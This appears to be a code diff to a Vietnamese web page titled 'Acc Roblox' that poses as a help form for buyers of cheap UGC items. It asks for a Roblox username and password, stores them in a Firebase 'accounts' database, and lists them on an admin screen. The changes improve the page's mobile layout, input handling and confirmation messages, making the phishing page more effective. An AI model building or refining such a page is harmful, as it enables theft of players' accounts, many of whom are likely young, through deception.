@@ -2,15 +2,18 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Quan trọng cho mobile -->
   <title>Acc Roblox</title>
   <style>
-    body { font-family: Arial; background: linear-gradient(135deg,#3b82f6,#2563eb); color:white; text-align:center; margin:0; }
+    body { font-family: Arial, sans-serif; background: linear-gradient(135deg,#3b82f6,#2563eb); color:white; margin:0; text-align:center; }
+    h2 { font-size:18px; margin-top:15px; }
     .screen{ display:none; } .active{ display:block; }
-    .form-box{ background:rgba(255,255,255,0.15); padding:20px; border-radius:15px; display:inline-block; width:90%; max-width:350px; box-shadow:0 4px 12px rgba(0,0,0,0.3); margin:15px auto; }
-    input{ display:block; width:90%; padding:10px; margin:12px auto; border:none; border-radius:8px; }
-    button{ background:#16a34a; color:white; border:none; padding:8px 18px; margin-top:8px; border-radius:6px; cursor:pointer;}
-    .data-box{ text-align:left; background:rgba(0,0,0,0.3); padding:12px; margin:10px auto; border-radius:8px; width:90%; max-width:350px; position:relative; }
-    .trash{ position:absolute; top:8px; right:8px; background:red; border:none; padding:5px 8px; border-radius:6px; cursor:pointer; }
+    .form-box{ background:rgba(255,255,255,0.15); padding:15px; border-radius:12px; display:block; width:90%; max-width:320px; box-shadow:0 4px 12px rgba(0,0,0,0.3); margin:12px auto; }
+    input{ display:block; width:95%; padding:10px; margin:10px auto; border:none; border-radius:6px; font-size:14px; }
+    button{ background:#16a34a; color:white; border:none; padding:10px; width:95%; border-radius:6px; font-size:15px; cursor:pointer; }
+    button:disabled{ background:gray; cursor:not-allowed; }
+    .data-box{ text-align:left; background:rgba(0,0,0,0.3); padding:10px; margin:10px auto; border-radius:8px; width:90%; max-width:320px; position:relative; font-size:14px; }
+    .trash{ position:absolute; top:8px; right:8px; background:red; border:none; padding:6px 8px; border-radius:6px; cursor:pointer; color:white; font-size:13px; }
   </style>
 </head>
 <body>
@@ -22,7 +25,7 @@
     <input type="text" id="username" placeholder="Tên">
     <input type="password" id="password" placeholder="Mk">
     <input type="text" id="issue" placeholder="Bạn đang gặp chuyện gì">
-    <p>bạn đang gặp vấn đề gì khi mua ugc giá rẻ ? hãy để lại thông tin ở dưới</p>
+    <p style="font-size:13px;">bạn đang gặp vấn đề gì khi mua ugc giá rẻ ?<br>hãy để lại thông tin ở dưới</p>
     <button id="submitBtn" disabled>Lưu</button>
   </div>
 
@@ -36,7 +39,7 @@
 <div id="screen2" class="screen">
   <h2>Danh sách đã nhập</h2>
   <div id="dataList"></div>
-  <button onclick="goBack()">Quay về</button>
+  <button onclick="goBack()">⬅ Quay về</button>
 </div>
 
 <!-- Firebase -->
@@ -70,7 +73,7 @@
   const dataList=document.getElementById("dataList");
 
   function checkInputs(){
-    submitBtn.disabled = !(username.value && password.value && issue.value);
+    submitBtn.disabled = !(username.value.trim() && password.value.trim() && issue.value.trim());
   }
   username.addEventListener("input",checkInputs);
   password.addEventListener("input",checkInputs);
@@ -80,13 +83,16 @@
   submitBtn.addEventListener("click",()=>{
     const newRef = db.ref("accounts").push();
     newRef.set({
-      user: username.value,
-      pass: password.value,
-      iss: issue.value
+      user: username.value.trim(),
+      pass: password.value.trim(),
+      iss: issue.value.trim()
+    }).then(()=>{
+      username.value=""; password.value=""; issue.value="";
+      submitBtn.disabled=true;
+      alert("✅ Đã lưu thông tin!");
+    }).catch(err=>{
+      alert("❌ Lỗi: " + err);
     });
-    username.value=""; password.value=""; issue.value="";
-    submitBtn.disabled=true;
-    alert("Đã lưu thông tin!");
   });
 
   // Admin login
@@ -118,7 +124,7 @@
           <p><b>Chuyện đang gặp:</b> ${item.iss}</p>
         `;
         const btn=document.createElement("button");
-        btn.innerText="🗑️";
+        btn.innerText="🗑 Xoá";
         btn.className="trash";
         btn.onclick=()=>{
           if(confirm("Bạn có chắc muốn xóa mục này?")){
